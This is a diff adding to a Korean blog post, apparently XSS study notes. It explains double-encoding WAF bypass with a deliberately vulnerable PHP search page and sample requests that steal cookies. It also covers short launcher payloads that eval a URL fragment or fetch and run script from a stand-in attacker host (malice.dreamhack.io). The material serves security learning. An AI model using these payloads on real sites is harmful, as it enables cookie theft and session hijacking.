@@ -13,7 +13,7 @@ toc: true
 toc_sticky: true
 
 date: 2025-07-28
-last_modified_at: 2025-07-28
+last_modified_at: 2025-07-30
 ---
 
 ## 🦥 본문
@@ -260,3 +260,69 @@ true => !![]
         document.body.innerHTML+="<img src=x: onerror=alert&#40;1&#41;>";
         document.body.innerHTML+="<body src=x: onload=alert&#40;1&#41;>";
         ```
+
+### 디코딩 전 필터링
+
+더블 인코딩 : 애플리케이션에서 전달받은 데이터를 다시 디코딩해서 사용하는 경우 발생. 웹 방화벽의 검증 우회 가능
+
+- 동작 흐름 예시
+    1. 공격자가 더블 URL 인코딩한 공격 코드 `%253Cscript%253E…` 
+    2. 웹 방화벽이 해당 데이터를 디코딩 후 검증. 디코딩한 결과 `%253Cscript%253E…` 안전하다고 판단
+    3. 애플리케이션이 해당 데이터를 디코딩하여 `<script>` 를 게시판 DB에 저장
+    4. 희생자가 해당 게시글을 읽으면 XSS 발생
+
+더블 디코딩 : 애플리케이션 검증 로직 이후에도 디코딩을 하는 경우 발생.
+
+- EX)
+    
+    ```html
+    
+    <?php
+    $query = $_GET["query"];
+    if (stripos($query, "<script>") !== FALSE) {
+        header("HTTP/1.1 403 Forbidden");
+        die("XSS attempt detected: " . htmlspecialchars($query, ENT_QUOTES|ENT_HTML5, "UTF-8"));
+    }
+    ...
+    $searchQuery = urldecode($_GET["query"]);
+    ?>
+    <h1>Search results for: <?php echo $searchQuery; ?></h1>
+    
+    //공격 실패 예시
+    POST /search?query=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
+    ...
+    -----
+    HTTP/1.1 403 Forbidden
+    XSS attempt detected: &lt;script&gt;alert(document.cookie)&lt;/script&gt;
+    
+    //더블 인코딩을 통한 공격 성공
+    POST /search?query=%253Cscript%253Ealert(document.cookie)%253C/script%253E HTTP/1.1
+    ...
+    -----
+    HTTP/1.1 200 OK
+    <h1>Search results for: <script>alert(document.cookie)</script></h1>
+    ```
+    
+
+### 길이 제한
+
+길이 제한의 경우, 다른 경로로 실행할 추가적인 코드(payload)를 URL fragment로 삽입 후, 삽입 지점에서 본 코드를 실행하는 짧은 코드 (launcher)를 사용 가능
+
+- Fragment로 스크립트를 넘겨준 후 XSS 지점에서 `location.hash`로 URL의 Fragment 부분을 추출하여 `eval()`로 실행하는 기법
+    
+    ```html
+    https://example.com/?q=<img onerror="eval(location.hash.slice(1))">#alert(document.cookie); 
+    ```
+    
+- 쿠키에 페이로드를 저장하는 방식
+- `import` 같은 외부 자원을 스크립트로 로드하는 방식
+    
+    ```html
+    import("http://malice.dreamhack.io");
+    
+    var e = document.createElement('script')
+    e.src='http://malice.dreamhack.io';
+    document.appendChild(e);
+    
+    fetch('http://malice.dreamhack.io').then(x=>eval(x.text()))
+    ```
